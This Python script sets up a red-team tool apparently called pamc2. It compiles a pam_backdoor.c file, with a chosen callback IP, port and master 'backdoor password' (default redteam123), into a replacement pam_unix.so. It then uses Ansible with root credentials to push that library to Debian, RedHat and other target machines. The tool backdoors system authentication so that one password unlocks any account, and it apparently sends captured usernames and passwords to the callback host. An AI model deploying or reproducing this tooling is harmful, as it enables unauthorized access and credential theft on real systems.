#!/usr/bin/python3
import os
import argparse
import subprocess

def setup_cmd_args():
    parser = argparse.ArgumentParser(description="Script to setup pamc2 for use on this machine")
    parser.add_argument('-i', '--ip', metavar="<Callback IP Address>",
                        required=True, dest="ip", action="store")
    parser.add_argument('-p', '--port', metavar="<Callback Port>",
                        required=True, dest="port", action="store")
    parser.add_argument('-f', '--format', metavar="<Format String>",
                        dest="format", help="Format string for socket messages (MUST HAVE 4 %s's (ip, message, username, password)); Default: '%s - %s %s:%s")
    parser.add_argument('--password', metavar="<Backdoor Password>",
                        dest="password", help="Backdoor password to gain access to any user; Default: redteam123")
    return parser.parse_args()

def setup():
    args = setup_cmd_args()

    ansible_user = input("Enter username of user with root access on the target machines: ")
    ansible_password = input("Enter password of this user: ")

    subprocess.run(f'sed -i "s/^ansible_user.*/ansible_user={ansible_user}/" ./inventory.ini', shell=True, text=True)
    subprocess.run(f'sed -i "s/^ansible_password.*/ansible_password={ansible_password}/" ./inventory.ini', shell=True, text=True)
    subprocess.run(f'sed -i "s/^ansible_become_password.*/ansible_become_password={ansible_password}/" ./inventory.ini', shell=True, text=True)

    subprocess.run(f'sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \\"{args.ip}\\"/" ./pam_backdoor.c', shell=True, text=True)
    subprocess.run(f'sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT {args.port}/" ./pam_backdoor.c', shell=True, text=True)

    if(args.format):
        subprocess.run(f'sed -i "s/^#define RET_FMT.*/#define RET_FMT \\"{args.format}\\"/" ./pam_backdoor.c', shell=True, text=True)

    if(args.password):
        subprocess.run(f'sed -i "s/^#define AUTH_PASSWORD.*/#define AUTH_PASSWORD \\"{args.password}\\"/" ./pam_backdoor.c', shell=True, text=True)

    subprocess.run('ansible-playbook main.yml -t setup', shell=True, text=True)

    subprocess.run('gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl', shell=True, text=True)

    subprocess.run('cp ./pam_unix.so ./roles/deploy_debian/files/', shell=True, text=True)
    subprocess.run('cp ./pam_unix.so ./roles/deploy_redhat/files/', shell=True, text=True)
    subprocess.run('cp ./pam_unix.so ./roles/deploy_generic/files/', shell=True, text=True)

    subprocess.run('ansible-playbook main.yml -t deploy', shell=True, text=True)

    # nohup python server.py > output.log 2>&1 &
    
def main():
    setup()
    
if (__name__ == '__main__'):
    main()